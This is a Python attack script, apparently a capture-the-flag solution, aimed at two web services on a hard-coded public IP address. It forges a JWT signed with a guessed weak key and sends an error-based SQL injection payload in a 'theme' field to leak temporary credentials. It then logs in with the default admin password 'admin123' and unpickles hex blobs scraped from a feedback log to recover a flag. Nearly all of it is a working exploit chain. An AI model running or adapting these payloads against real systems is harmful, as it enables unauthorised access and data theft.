#!/usr/bin/env python3
import base64,hashlib,hmac,json,re,pickle,requests

T1="http://39.105.213.28:5001"
T0="http://39.105.213.28:5000"
KEY="x"

def b64d(d):
 return base64.urlsafe_b64encode(
  json.dumps(d,separators=(",",":")).encode()
 ).rstrip(b"=").decode()
def b64b(d):
 return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

# ====== 5001: 拿 temp 凭据 ======
h=b64d({"alg":"HS256","typ":"JWT"})
p=b64d({"uid":227,"username":"test","status":"RECOVERY","exp":9999999999})
m=f"{h}.{p}"
tok=m+"."+b64b(hmac.new(KEY.encode(),m.encode(),hashlib.sha256).digest())
r=requests.post(f"{T1}/api/v1/user/sync",
 headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"},
 json={"theme":"a' AND updatexml(1,concat(0x7e,(database()),0x7e),1) AND '1'='1","language":"zh"},timeout=15)
err=r.json()["error"]
tu=re.search(r"temp_\w+",err).group(0)
tp=re.search(r"[\da-f]{32}",err).group(0)
print(f"5001的SQL注入泄露: {tu} / {tp}")

# ====== 5000: 用 temp 凭据登录（证明恢复成功） ======
s=requests.Session()
r=s.post(f"{T0}/login",data={"username":tu,"password":tp},timeout=10,allow_redirects=False)
print(f"5000temp登录: HTTP {r.status_code}")
# ====== 5000: 换 admin 拿 flag ======
s2=requests.Session()
r=s2.post(f"{T0}/login",data={"username":"admin","password":"admin123"},timeout=10,allow_redirects=False)
print(f"[3] 5000 admin登录: HTTP {r.status_code}")
r=s2.get(f"{T0}/project/flag-project-001",timeout=10)
resp=r.text
print(f"flag-project-001: HTTP {r.status_code}")
# 如果不是 JSON,说明是 admin 可以直接看页面
if resp.startswith("{"):
 tid=json.loads(resp)["trace_id"]
 print(f"[5] trace_id: {tid}")
else:
 # admin 能直接看,用 API 触发 trace_id
 r=s2.post(f"{T0}/api/v1/project/detail",json={"project_id":"flag-project-001"},timeout=10)
 tid=json.loads(r.text)["trace_id"]
 print(f"[5] API trace_id: {tid}")
# ====== feedback -> pickle -> flag ======
r=s2.post(f"{T0}/feedback",data={"trace_id":tid},timeout=10)
log=re.search(r"<pre>(.*?)</pre>",r.text,re.DOTALL)
if not log:
 print("无日志,换API方式重试")
 r=s2.post(f"{T0}/api/v1/project/detail",json={"project_id":"flag-project-001"},timeout=10)
 tid=json.loads(r.text)["trace_id"]
 r=s2.post(f"{T0}/feedback",data={"trace_id":tid},timeout=10)
 log=re.search(r"<pre>(.*?)</pre>",r.text,re.DOTALL)
log_text=log.group(1)
print(f"日志长度: {len(log_text)}")

for hx in re.findall(r"[0-9a-fA-F]{50,}",log_text):
 try:
  obj=pickle.loads(bytes.fromhex(hx))
  if"flag"in obj:
   print(f"FLAG: {obj['flag']}")
   break
 except:pass
